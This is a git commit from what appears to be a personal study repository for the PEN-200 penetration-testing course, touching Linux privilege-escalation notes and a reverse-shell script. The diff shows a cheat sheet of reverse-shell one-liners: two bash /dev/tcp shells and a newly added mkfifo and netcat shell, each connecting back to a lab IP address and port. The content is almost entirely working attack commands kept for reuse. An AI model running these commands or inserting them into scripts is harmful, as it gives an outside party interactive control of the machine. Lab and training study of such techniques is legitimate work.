4e1dc3f1c8406f6cab0d1a2715c2f11774eb951c
eugeneewe <eugeneewexen@gmail.com>
2024-05-01 21:40:39 +0800

    modified:   PEN-200/17_Linux Privilege Escalation/17.3_Insecure File Permissions/PEN-200 17.3.1 Q1 	modified:   PEN-200/17_Linux Privilege Escalation/17.3_Insecure File Permissions/PEN-200 17.3.1 Q2 	modified:   Reverse Shell/bash-revsh.sh

--- Reverse Shell/bash-revsh.sh
+++ Reverse Shell/bash-revsh.sh
@@ -7,3 +7,6 @@ bash -c "bash -i >& /dev/tcp/192.168.45.171/8443 0>&1"
 # Try this before if above cant works
 #!/bin/bash
 /bin/bash -c 'exec bash -i &>/dev/tcp/192.168.45.237/6666 0>&1'
+
+# Another one-liner reverse shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.207 6666 >/tmp/f
